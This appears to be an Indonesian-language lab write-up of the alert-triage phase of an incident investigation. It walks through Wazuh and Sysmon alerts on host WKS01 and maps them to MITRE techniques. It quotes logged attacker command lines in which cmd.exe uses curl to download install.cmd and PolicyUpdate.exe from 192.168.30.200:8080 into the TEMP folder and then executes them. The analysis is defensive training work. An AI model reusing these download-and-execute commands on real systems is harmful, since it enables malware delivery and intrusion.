# 01 - Alert Triage

## Alert Awal

Saya buka Wazuh dashboard dan lihat ada cluster alert dari WKS01 dalam rentang waktu yang sangat pendek — sekitar 16:35:28 sampai 16:36:26 WIB. Total 154 hits di time range 2 jam terakhir, tapi yang menarik perhatian saya adalah sekelompok alert level tinggi yang muncul hampir bersamaan.

Alert pertama yang saya perhatikan:

| Timestamp (WIB) | Rule ID | Level | Description |
|---|---|---|---|
| 16:35:28.188 | 92005 | 4 | Command shell started script with /c modifier |
| 16:35:29.190 | 92213 | 15 | Executable file dropped in folder commonly used by malware |
| 16:35:29.229 | 92074 | 12 | curl.exe launched with commands to create a binary file |
| 16:35:29.258 | 92213 | 15 | Executable file dropped in folder commonly used by malware |
| 16:35:29.394 | 92032 | 3 | Suspicious Windows cmd shell execution |

Rule 92213 level 15 — itu critical. Dan muncul berkali-kali dalam hitungan milidetik. Worth diinvestigasi.

## Initial Assessment

### Alert 92005 — Command shell started script with /c modifier
**Timestamp:** 16:35:28.188 WIB (utcTime: 09:35:26.797)

Saya expand alert ini. Yang langsung mencolok:

- **commandLine:** `curl -s http://192.168.30.200:8080/install.cmd -o C:\Users\userBeta\AppData\Local\Temp\i.cmd`
- **parentCommandLine:** `cmd.exe /c curl -s http://192.168.30.200:8080/install.cmd -o ... && C:\Users\userBeta\AppData\Local\Temp\i.cmd`
- **parentImage:** `C:\Windows\System32\cmd.exe`
- **user:** `LAB\userBeta`
- **MITRE:** T1059 — Command and Scripting Interpreter

Jadi `cmd.exe` menjalankan `curl` untuk download file `install.cmd` dari IP `192.168.30.200` port 8080, simpan ke folder TEMP userBeta, lalu langsung execute file yang baru didownload (`&& ... i.cmd`). Ini pola klasik download-and-execute.

IP `192.168.30.200` bukan IP internal yang saya kenal di environment ini. Perlu dicek lebih lanjut.

### Alert 92213 — Executable file dropped in folder commonly used by malware
**Timestamp:** 16:35:29.190 WIB (utcTime: 09:35:27.300)

- **image:** `C:\Windows\system32\curl.exe`
- **targetFilename:** `C:\Users\userBeta\AppData\Local\Temp\i.cmd`
- **user:** `LAB\userBeta`
- **Sysmon Event ID:** 11 (File Created)
- **MITRE:** T1105 — Ingress Tool Transfer

Sysmon mencatat `curl.exe` menulis file `i.cmd` ke folder TEMP. Level 15 karena Wazuh mendeteksi executable di-drop ke folder yang biasa dipakai malware (AppData\Local\Temp). File `i.cmd` ini kemungkinan batch script yang didownload dari server attacker.

### Alert 92074 — curl.exe launched with commands to create a binary file
**Timestamp:** 16:35:29.229 WIB (utcTime: 09:35:27.425)

- **commandLine:** `curl -s http://192.168.30.200:8080/PolicyUpdate.exe -o C:\Users\userBeta\AppData\Local\Temp\PolicyUpdate.exe`
- **parentCommandLine:** `cmd.exe /c curl -s http://192.168.30.200:8080/install.cmd ...`
- **user:** `LAB\userBeta`
- **MITRE:** T1105 — Ingress Tool Transfer

Ini yang lebih menarik. Setelah `install.cmd` didownload dan dieksekusi, script itu ternyata menjalankan curl lagi — kali ini download file `PolicyUpdate.exe` dari server yang sama. Nama file `PolicyUpdate.exe` terlihat seperti nama yang sengaja dibuat agar terlihat legitimate.

Jadi flow-nya sejauh ini: `cmd.exe` → download `install.cmd` → execute → download `PolicyUpdate.exe` → kemungkinan execute juga.

## Triage Summary

| # | Pertanyaan | Jawaban Sementara |
|---|---|---|
| 1 | Apa yang terjadi? | userBeta di WKS01 menjalankan chain download-and-execute dari IP 192.168.30.200 |
| 2 | Siapa user-nya? | LAB\userBeta — domain user biasa |
| 3 | Apa yang didownload? | `install.cmd` (batch script) dan `PolicyUpdate.exe` (binary) |
| 4 | Dari mana? | http://192.168.30.200:8080 — IP tidak dikenal |
| 5 | Trigger awal? | Belum jelas — parent process chain menunjukkan `cmd.exe` tapi bagaimana cmd.exe ini dijalankan? Tidak ada alert yang menunjukkan proses awal |
| 6 | Severity? | High — executable download dari external IP + execution di user context |

Yang belum terjawab: **bagaimana `cmd.exe` pertama kali dijalankan?** Alert yang ada tidak menunjukkan parent process di atas `cmd.exe`. Ini perlu digali lebih dalam di fase investigasi.

Ada juga alert-alert lain yang perlu saya cek: 92217 (Executable dropped in Windows root folder) di 16:43:48, dan 67028 (Special privileges assigned to new logon) di 16:47:38. Tapi prioritas pertama adalah memahami chain execution utama.
